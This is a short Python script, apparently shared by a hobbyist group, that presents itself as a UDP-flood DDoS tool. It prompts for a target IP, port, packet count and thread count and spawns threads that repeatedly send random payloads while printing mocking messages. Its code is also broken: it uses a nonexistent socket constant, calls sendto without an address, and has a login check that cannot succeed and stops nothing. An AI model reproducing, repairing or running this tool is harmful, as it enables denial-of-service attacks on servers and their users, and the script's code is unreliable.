#python 3.7.1
#code by bimzz

import socket
import random
import threading
import os
import time
import sys

#tampilan
x = "KyTeam"
y = "BimzzDDOS"

def login():
  user = int(input("Masukkan Username: "))
  pasw = int(input("Masukkan Password: "))
  if user ==x and pasw ==y:
    print("[Bimzz] Succes Login")
    time.sleep(2)
  else:
    print("[Bimzz] Username/Password Salah!!")
    time.sleep(2)
    
if __name__ == "__main__":
  print("""\u001b[31m
  [Bimzz] ==> LoginMenu!!""")
  login()
  
#ddos
print("------------------------------------------------")
print("[+] Tools DDoS BETA VERSION By Bimzz")
print("[+] Discord : KyBimzZ  び#1716")
print("[+] YouTube : Bimzz")
print("[+] Author  : Bimzz x KyTeam")
print("[+] KyTeam  : https://discord.gg/YMT9utYW5U")
print("------------------------------------------------")

ip_bimzz = str(input("[Bimzz] IP TARGET : "))
port_bimzz = int(input("[Bimzz] PORT TARGET : "))
paket_bimzz = int(input("[Bimzz] PACKETS : "))
threads_bimzz = int(input("[Bimzz] THREADS (9024): "))
os.system("clear")
print("[Bimzz] => [Wait 3s]")
time.sleep(3)
def bimzz():
    bimzz_data = random._urandom(9024)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_bimzz,port_bimzz))
            s.sendto(bimzz_data)
            for x in range(paket_bimzz):
                s.sendto(bimzz_data)
            print("[•] BIMZZ ATTACKING SERVERS!!!")
        except:
            print("[•] Yah Down Yah? Awokwsaowkswosk!!!")
            
for y in range(threads_bimzz):
    th = threading.Thread(target=bimzz)
    th.start()
